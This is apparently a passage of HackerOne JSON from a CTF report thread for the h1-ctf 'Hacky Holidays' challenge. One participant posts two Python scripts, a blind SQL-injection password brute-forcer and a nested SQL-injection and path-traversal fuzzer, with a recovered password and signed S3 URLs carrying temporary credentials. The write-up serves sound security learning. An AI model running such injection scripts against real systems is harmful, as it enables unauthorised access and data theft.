%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=309388e27c8845d635967f336f0dc7d2bf4dc94aadb662e75f319b24e00e63b6"},{"id":1139913,"filename":"resume.svg","type":"image/svg+xml","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/k9vzzd9neg13rvf4ohzp4w87atkd?response-content-disposition=attachment%3B%20filename%3D%22resume.svg%22%3B%20filename%2A%3DUTF-8%27%27resume.svg\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=65ff31e49be790fe66e3bfaf31477e262234261ad045d27d91f1c2f4ccb359fe"},{"id":1139915,"filename":"resume.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y3iju2fivd78rvlce2j3y2uhhenv?response-content-disposition=attachment%3B%20filename%3D%22resume.png%22%3B%20filename%2A%3DUTF-8%27%27resume.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=450673b21c13b7a2504d08f59da88f0db09e867a8fd45584761495f002b30735"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10249739,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again, I just realized I forgot to include my scripts. And well... I also failed great in hiding my cringe early hacker name: 'nietzschewhite'.\n\nI hope you've had a wonderful new year!\n@holme\n\nDay 9:\n```python\nimport argparse\nimport requests\nimport warnings\nfrom tqdm import tqdm\n\nwarnings.filterwarnings(\"ignore\")\n\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-c\", \"--cookie\", help=\"provide a session cookie for a session where you've already completed the quiz\", required=True)\nargs = parser.parse_args()\n\ncharset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789;#$£}{[]\u0026.,!=+@()?-~*'\u003c\\\\\u003e\"\n\nurl = 'https://hackyholidays.h1ctf.com/evil-quiz'\n\ncookies = {'session': args.cookie}\n\npassword = \"\"\n\n\ndef brute():\n    global password\n    found_char = True\n    while found_char:\n        found_char = False\n        for c in tqdm(charset):\n            body = {\"name\": \"bla' UNION SELECT 1,2,3,password FROM admin WHERE password LIKE BINARY('\"+password+c+\"%') OR 1='2\"}\n            response_1 = requests.post(url, data = body, cookies=cookies, verify=False)\n            if response_1.status_code == 200:\n                response_2 = requests.get(url+\"/score\", cookies=cookies, verify=False)\n                if \"There is 0 other player(s) with the same name as you!\" not in response_2.text:\n                    password+=c\n                    tqdm.write(\"PASSWORD: \"+password)\n                    break\n            else:\n                print(\"Ehh, something went wrong. Got this status code: \"+response_1.status_code)\n                return\n    print(\"Couldn't find more chars. Final found is: \"+password)\n\nbrute()\n\n#Password: S3creT_p4ssw0rd-$\n```\n\nDay 11:\n\n```python\nimport sys\nimport requests\nimport warnings\nimport argparse\nfrom tqdm import tqdm\n\nwarnings.filterwarnings(\"ignore\")\n\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-u\", \"--url\", help=\"provide a URL to request on /r3c0n_server_4fdk597/URL. Use 'BRUZZ' as the keyword\", required=True)\nparser.add_argument(\"-w\", \"--wordlist\", help=\"provide the path of the wordlist to use\")\nparser.add_argument(\"-f\", \"--filter\", help=\"provide a value to filter out responses based on. The value will be looked for in the response body\", required=True)\nparser.add_argument(\"-b\", \"--bruteforce\", help=\"bruteforce mode\", action=\"store_true\")\nargs = parser.parse_args()\n\nbase_url = 'https://hackyholidays.h1ctf.com'\nurl = args.url\nwordlist = args.wordlist\nresponse_filter = args.filter\n\ndef fuzz(lines):\n    for w in tqdm(lines):\n        fuzz_payload = url.replace(\"BRUZZ\", w.rstrip())\n        url1 = base_url+\"/r3c0n_server_4fdk59/album?hash=a'UNION  SELECT \\\"' UNION SELECT 1,2,'../\"+fuzz_payload+\"\\\",2,3-- -\"\n        response_1 = requests.get(url1, verify=False)\n        url2 = base_url+response_1.text[response_1.text.find(\"/r3c0n_server_4fdk59/picture?data=\"):].split(\"\\\"\")[0]\n        response_2 = requests.get(url2, verify=False)\n        if response_filter not in response_2.text:\n            tqdm.write(\"FOUND: \"+w.rstrip())\n\ndef brute(charset):\n    found_chars = \"\"\n    found_char = True\n    while found_char:\n        found_char = False\n        for c in charset:\n            brute_payload = url.replace(\"BRUZZ\", found_chars+c)\n            url1 = base_url+\"/r3c0n_server_4fdk59/album?hash=a'UNION  SELECT \\\"' UNION SELECT 1,2,'../\"+brute_payload+\"\\\",2,3-- -\"\n            response_1 = requests.get(url1, verify=False)\n            url2 = base_url+response_1.text[response_1.text.find(\"/r3c0n_server_4fdk59/picture?data=\"):].split(\"\\\"\")[0]\n            response_2 = requests.get(url2, verify=False)\n            if response_filter not in response_2.text:\n                found_char = True\n                found_chars += c\n                print(\"NEW CHAR FOUND: \"+found_chars)\n                break\n    print(\"Couldn't find more chars. Final found is: \"+found_chars)\n\nif args.bruteforce is not None:\n    charset = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n    brute(charset)\nelif args.wordlist is not None:\n    try:\n        file1 = open(wordlist, 'r') \n        lines = file1.readlines() \n    except:\n        print(\"Couldn't find wordlist: \"+wordlist)\n        quit()\n    fuzz(lines)\nelse:\n    print(\"You must either specify a wordlist (-w) or user bruteforce mode (-b)\")\n    quit()\n```","automated_response":false,"created_at":"2021-01-01T21:10:27.975Z","updated_at":"2021-01-01T21:10:27.975Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1141121,"filename":"day_9.py","type":"text/x-python3","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qtunfs98mvepgra3cz872l01924w?response-content-disposition=attachment%3B%20filename%3D%22day_9.py%22%3B%20filename%2A%3DUTF-8%27%27day_9.py\u0026response-content-type=text%2Fx-python3\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e67150c14b1ca9765526e0cb40a0cf12b9a73c93d9cccd4a299007bcd1321e37"},{"id":1141120,"filename":"day_11.py","type":"text/x-python3","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cexe1j22otlivzpo749mavmefwna?response-content-disposition=attachment%3B%20filename%3D%22day_11.py%22%3B%20filename%2A%3DUTF-8%27%27day_11.py\u0026response-content-type=text%2Fx-python3\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d0ca9b38eb14d499904586ba9c15ffadc10b593509d86deaf234c17422c9e467"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10268955,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","automated_response":false,"created_at":"2021-01-04T22:31:53.835Z","updated_at":"2021-01-04T22:31:53.835Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10268999,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nHappy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to ██████████@hackerone.com \n\nThanks,\nBen","automated_response":false,"created_at":"2021-01-04T22:34:33.687Z","updated_at":"2021-01-11T21:24:10.305Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10333490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Congrats on being selected as one of the top 3 write-ups for 12 Days of Hacky Holidays and thank you for helping us stop the Grinch!","automated_response":false,"created_at":"2021-01-11T21:19:51.707Z","updated_at":"2021-01-11T21:19:51.707Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10334420,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec! Thanks a lot for the great CTF and for keeping me entertained for 12 days (and nights). And thanks for selecting me as one of the top 3 write-ups!\n\nIf it's ok, I'm planning to post a revised version of my writeup in the summary (mainly some grammar stuff).\nIt's late for me (~12am) so I'll do it tomorrow.\n\nBest regards,\n@holme","automated_response":false,"created_at":"2021-01-11T22:52:39.488Z","updated_at":"2021-01-11T22:52:39.488Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10339516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm posting the revised write-up in the summary field now. I fixed some typos and grammar. I also modified the script for day 9 a bit. Could we maybe clear out my initial write-up in the comment? And maybe also my initial scripts? However, I'm still using the same image attachments. I hope that's possible even after removing/censoring my initial write-up?\n\nBest regards,\n@holme","automated_response":false,"created_at":"2021-01-12T13:38:08.696Z","updated_at":"2021-01-12T13:38:08.696Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1154657,"filename":"day5_zip_crack_v2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ckruv13i9382wufvs84b0jlf7lwd?response-content-disposition=attachment%3B%20filename%3D%22day5_zip_crack_v2.png%22%3B%20filename%2A%3DUTF-8%27%27day5_zip_crack_v2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=420f7b5117fe250a16475ada8a439b4d2555932c6eb82c6b58f508a100b9550e"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10343229,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-01-12T17:54:11.468Z","updated_at":"2021-01-12T17:54:11.468Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"holme","url":"/holme"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10343244,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting limited disclosure so it only shows the summary. ","automated_response":false,"created_at":"2021-01-12T17:54:44.581Z","updated_at":"2021-01-12T17:54:44.581Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10345187,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Perfect, thanks!","automated_response":false,"created_at":"2021-01-12T21:05:43.498Z","updated_at":"2021-01-12T21:05:43.498Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10345188,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-12T21:05:43.584Z","updated_at":"2021-01-12T21:05:43.584Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10345229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec! Sadly all the images are not being displayed in the limited disclosure... Do you have a suggestion/know how I can fix this? A bit sad to miss all the image attachments.\n\nBest regards,\n@holme","automated_response":false,"created_at":"2021-01-12T21:09:41.732Z","updated_at":"2021-01-12T21:09:41.732Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10345305,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not sure, you're welcome to push to Github pages and use that as your write up.","automated_response":false,"created_at":"2021-01-12T21:16:40.529Z","updated_at":"2021-01-12T21:16:40.529Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10345321,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok thanks, will move my writeup","automated_response":false,"created_at":"2021-01-12T21:18:53.190Z","updated_at":"2021-01-12T21:18:53.190Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10345352,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @namhamsec, sorry to bother you again. Could a solution be to just do a full disclosure and censor the comment(s) (so the attachments become public)? If that's not possible/too troublesome on your end, I'll try and move the 